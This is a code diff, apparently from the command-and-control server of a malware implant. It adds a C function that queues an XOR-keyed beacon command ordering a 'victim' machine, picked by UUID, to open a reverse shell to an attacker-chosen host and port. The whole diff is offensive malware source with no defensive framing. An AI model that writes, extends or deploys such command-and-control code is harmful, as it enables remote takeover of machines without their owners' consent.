@@ -115,6 +115,37 @@ int net_update_commands(net_server_beacon_t *command, net_server_beacon_t **comm
   return -1;
 }
 
+bool net_update_commands_shell(char *host,
+                               int port,
+                               char *uuid,
+                               net_server_beacon_t **p_commands){
+  /*
+    :TODO: send reverse shell command to victim uuid
+    :host: host domain or ip
+    :port: shell port
+    :uuid: victim uuid
+    :p_commands: commands queue pointer
+    :returns: boolean
+  */
+  if (port < NET_PORT_MIN || port > NET_PORT_MAX){
+    return false;
+  } else if (strlen(host) > MAX_DOMAIN_LEN){
+    return false;
+  }
+  net_server_cmd_shell_t *p_cmd_shell = malloc(sizeof(net_server_cmd_shell_t));
+  net_server_beacon_t *p_command = malloc(sizeof(net_server_beacon_t));
+  strncpy(p_cmd_shell->host, host, MAX_DOMAIN_LEN);
+  p_cmd_shell->port = port;
+  p_command->xor_key = crypt_random_xor_key();
+  strncpy(p_command->uuid, uuid, SYS_UUID_SIZE);
+  p_command->status = true;
+  p_command->command = NET_SERVER_CMD_SHELL;
+  memcpy(p_command->data, p_cmd_shell, sizeof(net_server_cmd_shell_t));
+  net_update_commands(p_command, p_commands);
+  free(p_cmd_shell);
+  return true;
+}
+
 bool net_remove_commands(net_server_beacon_t *command, net_server_beacon_t **commands){
   for (int i = 0; i < NET_MAX_CLIENTS; i++){
     if (commands[i] != NULL && strcmp(commands[i]->uuid, command->uuid) == 0){
